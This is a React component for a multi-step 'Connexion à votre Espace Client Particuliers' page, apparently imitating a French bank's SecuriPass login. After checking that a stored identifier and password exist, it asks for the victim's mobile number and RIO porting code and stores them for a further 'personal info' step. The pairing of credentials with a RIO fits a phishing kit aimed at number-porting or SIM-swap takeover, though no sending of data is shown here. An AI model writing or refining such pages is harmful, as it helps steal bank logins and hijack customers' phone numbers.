import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Phone, Check } from 'lucide-react';

const PhoneVerification = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [rioNumber, setRioNumber] = useState('');

  useEffect(() => {
    const identifier = sessionStorage.getItem('securipass_identifier');
    const password = sessionStorage.getItem('securipass_password');
    if (!identifier || !password) {
      navigate('/login');
    }
  }, [navigate]);

  const handlePhoneChange = (e) => {
    // Allow digits and spaces, limit length
    const value = e.target.value.replace(/[^\d\s]/g, '').slice(0, 14);
    setPhoneNumber(value);
  };

  const handleRioChange = (e) => {
    // RIO format is usually alphanumeric (12 chars)
    const value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 12);
    setRioNumber(value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (phoneNumber.replace(/\s/g, '').length >= 9 && rioNumber.length >= 1) {
      sessionStorage.setItem('securipass_phone', phoneNumber);
      sessionStorage.setItem('securipass_rio', rioNumber);
      navigate('/personal-info-step');
    }
  };

  const isFormValid = phoneNumber.replace(/\s/g, '').length >= 9 && rioNumber.length >= 1;

  return (
    <div className="min-h-screen bg-white py-8 px-4" data-testid="phone-verification">
      <div className="max-w-md mx-auto">
        <h1 className="text-xl font-bold text-[#1a2b6d] mb-8 text-center md:text-left">
          Connexion à votre Espace Client Particuliers
        </h1>

        {/* Stepper */}
        <div className="flex items-center justify-center mb-10">
          <div className="flex flex-col items-center">
            <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center shadow-md">
              <Check size={18} className="text-white" strokeWidth={3} />
            </div>
            <span className="text-xs text-gray-600 mt-2">Connexion</span>
          </div>
          <div className="h-0.5 w-16 bg-gradient-to-r from-green-500 to-[#e60028] mx-2 mb-5" />
          <div className="flex flex-col items-center">
            <div className="w-8 h-8 rounded-full bg-[#e60028] flex items-center justify-center shadow-md">
              <span className="text-white font-bold text-sm">2</span>
            </div>
            <span className="text-xs text-gray-600 mt-2">Téléphone</span>
          </div>
        </div>

        {/* Phone icon */}
        <div className="flex justify-center mb-4">
          <div className="w-14 h-14 rounded-full bg-[#e60028]/10 flex items-center justify-center">
            <Phone size={26} className="text-[#e60028]" />
          </div>
        </div>

        <h2 className="text-xl font-bold text-[#1a2b6d] text-center mb-2">
          Vérification de votre identité
        </h2>
        <p className="text-center text-gray-600 text-sm mb-8">
          Pour sécuriser votre accès, veuillez confirmer votre numéro de téléphone mobile.
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Phone number */}
          <div>
            <label className="block text-sm font-semibold text-gray-800 mb-2">
              Numéro de téléphone mobile
            </label>
            <div className="flex items-stretch border border-gray-300 rounded-lg overflow-hidden focus-within:border-[#1a2b6d] focus-within:ring-2 focus-within:ring-[#1a2b6d]/20">
              <div className="flex items-center gap-2 px-3 bg-gray-50 border-r border-gray-300">
                <span className="text-lg leading-none" aria-hidden="true">🇫🇷</span>
                <span className="text-gray-700 font-medium">+33</span>
              </div>
              <input
                type="tel"
                inputMode="numeric"
                value={phoneNumber}
                onChange={handlePhoneChange}
                placeholder="06 XX XX XX XX"
                data-testid="phone-input"
                className="flex-1 px-3 py-3 text-base text-gray-900 focus:outline-none"
              />
            </div>
          </div>

          {/* RIO number */}
          <div>
            <label className="block text-sm font-semibold text-gray-800 mb-2">
              Numéro de RIO
            </label>
            <input
              type="text"
              value={rioNumber}
              onChange={handleRioChange}
              placeholder="RIO de votre opérateur"
              data-testid="rio-input"
              className="w-full px-3 py-3 text-base text-gray-900 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1a2b6d] focus:ring-2 focus:ring-[#1a2b6d]/20 tracking-wider uppercase"
            />
            <p className="text-xs text-gray-500 mt-1.5">
              Composez le 3179 depuis votre mobile pour obtenir votre RIO.
            </p>
          </div>

          <button
            type="submit"
            disabled={!isFormValid}
            data-testid="phone-confirm-btn"
            className="w-full py-4 text-lg font-semibold text-white bg-[#e60028] hover:bg-[#c00020] rounded-full transition-all duration-200 shadow-md hover:shadow-lg disabled:opacity-40 disabled:cursor-not-allowed mt-2"
          >
            Confirmer
          </button>

          <div className="text-center pt-2">
            <a
              href="#"
              onClick={(e) => e.preventDefault()}
              className="text-[#1a2b6d] hover:underline text-sm font-medium"
              data-testid="no-phone-access-link"
            >
              Je n'ai plus accès à ce numéro
            </a>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PhoneVerification;
